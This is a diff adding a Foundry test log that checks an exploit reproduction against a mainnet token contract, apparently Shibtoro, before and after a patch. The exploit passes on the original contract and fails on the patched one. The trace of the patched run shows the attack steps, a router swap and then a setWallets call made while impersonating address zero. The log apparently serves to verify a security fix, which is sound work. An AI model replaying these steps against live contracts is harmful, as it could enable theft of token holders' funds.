@@ -1,0 +1,78 @@
+===== original batch =====
+Compiling 20 files with Solc 0.8.26
+Solc 0.8.26 finished in 422.52ms
+Compiler run successful!
+2026-10-10T05:29:41.942548Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/mainnet/26159946"
+
+Ran 1 test for test/Original_0.t.sol:ExploitOriginal_0
+[PASS] testExploit() (gas: 579676)
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 36.90s (28.87s CPU time)
+
+Ran 1 test suite in 38.56s (36.90s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
+
+===== patched batch =====
+Compiling 1 files with Solc 0.8.26
+Solc 0.8.26 finished in 355.73ms
+Compiler run successful!
+2026-10-10T05:30:23.754201Z  WARN foundry_fork_db::cache: Failed to read cache file err=Os { code: 2, kind: NotFound, message: "No such file or directory" } path="/Users/carl/.foundry/cache/rpc/mainnet/26159949"
+
+Ran 1 test for test/Patched_0.t.sol:ExploitPatched_0
+[FAIL: Shibtoro: fee wallets must differ] testExploit() (gas: 283322)
+Traces:
+  [283322] ExploitPatched_0::testExploit()
+    ├─ [0] VM::startPrank(dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802])
+    │   └─ ← [Return]
+    ├─ [252326] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5000000000000000000}(0, [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7], dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802], 1791610211 [1.791e9])
+    │   ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 5000000000000000000}()
+    │   │   ├─ emit Deposit(dst: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, wad: 5000000000000000000 [5e18])
+    │   │   └─ ← [Stop]
+    │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xA96A5275d79e8e6FAcc2476707ADA70f907ea305, 5000000000000000000 [5e18])
+    │   │   ├─ emit Transfer(from: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, to: 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305, value: 5000000000000000000 [5e18])
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   ├─ [16875] 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7::balanceOf(dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802]) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [2504] 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305::getReserves() [staticcall]
+    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000f8655272931f8b7b74bae20fd200000000000000000000000000000000000000000000000209ffbc105f4865bd000000000000000000000000000000000000000000000000000000006ab69143
+    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA96A5275d79e8e6FAcc2476707ADA70f907ea305) [staticcall]
+    │   │   └─ ← [Return] 42613989391325750717 [4.261e19]
+    │   ├─ [176403] 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305::swap(2302977420001685786868433703963 [2.302e30], 0, dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802], 0x)
+    │   │   ├─ [141674] 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7::transfer(dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802], 2302977420001685786868433703963 [2.302e30])
+    │   │   │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
+    │   │   │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
+    │   │   │   ├─ [4082] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::getAmountsOut(2302977420001685786868433703963 [2.302e30], [0x8AeB7C2D4758eb51080493E2Cb290d62510659C7, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   ├─ [504] 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000f8655272931f8b7b74bae20fd200000000000000000000000000000000000000000000000209ffbc105f4865bd000000000000000000000000000000000000000000000000000000006ab69143
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000001d115245e18b63716c8382541b0000000000000000000000000000000000000000000000003689ef3086d69825
+    │   │   │   ├─ [45515] 0x8c4B8A378b37E63Cb18795F3753A228f0F2FEe7A::checkUser(0xA96A5275d79e8e6FAcc2476707ADA70f907ea305, dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802], 2302977420001685786868433703963 [2.302e30])
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   │   ├─ emit Transfer(from: 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305, to: 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7, value: 161208419400118005080790359277 [1.612e29])
+    │   │   │   ├─ emit Transfer(from: 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305, to: 0x000000000000000000000000000000000000dEaD, value: 23029774200016857868684337039 [2.302e28])
+    │   │   │   ├─ emit Transfer(from: 0xA96A5275d79e8e6FAcc2476707ADA70f907ea305, to: dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802], value: 2072679678001517208181590333568 [2.072e30])
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
+    │   │   ├─ [2875] 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7::balanceOf(0xA96A5275d79e8e6FAcc2476707ADA70f907ea305) [staticcall]
+    │   │   │   └─ ← [Return] 17388571930486144533614172437843 [1.738e31]
+    │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA96A5275d79e8e6FAcc2476707ADA70f907ea305) [staticcall]
+    │   │   │   └─ ← [Return] 42613989391325750717 [4.261e19]
+    │   │   ├─ emit Sync(reserve0: 17388571930486144533614172437843 [1.738e31], reserve1: 42613989391325750717 [4.261e19])
+    │   │   ├─ emit Swap(sender: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, amount0In: 11607387977386873597098869148 [1.16e28], amount1In: 5000000000000000000 [5e18], amount0Out: 2302977420001685786868433703963 [2.302e30], amount1Out: 0, to: dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802])
+    │   │   └─ ← [Stop]
+    │   ├─ [2875] 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7::balanceOf(dummyUser: [0x72A5835a219b525bEA1cB654186A40C6d39ab802]) [staticcall]
+    │   │   └─ ← [Return] 2074064177412594186403348232958 [2.074e30]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [0] VM::startPrank(0x0000000000000000000000000000000000000000)
+    │   └─ ← [Return]
+    ├─ [1278] 0x8AeB7C2D4758eb51080493E2Cb290d62510659C7::setWallets(ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ExploitPatched_0: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Revert] Shibtoro: fee wallets must differ
+    └─ ← [Revert] Shibtoro: fee wallets must differ
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 25.76s (20.63s CPU time)
+
+Ran 1 test suite in 27.20s (25.76s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/Patched_0.t.sol:ExploitPatched_0
+[FAIL: Shibtoro: fee wallets must differ] testExploit() (gas: 283322)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
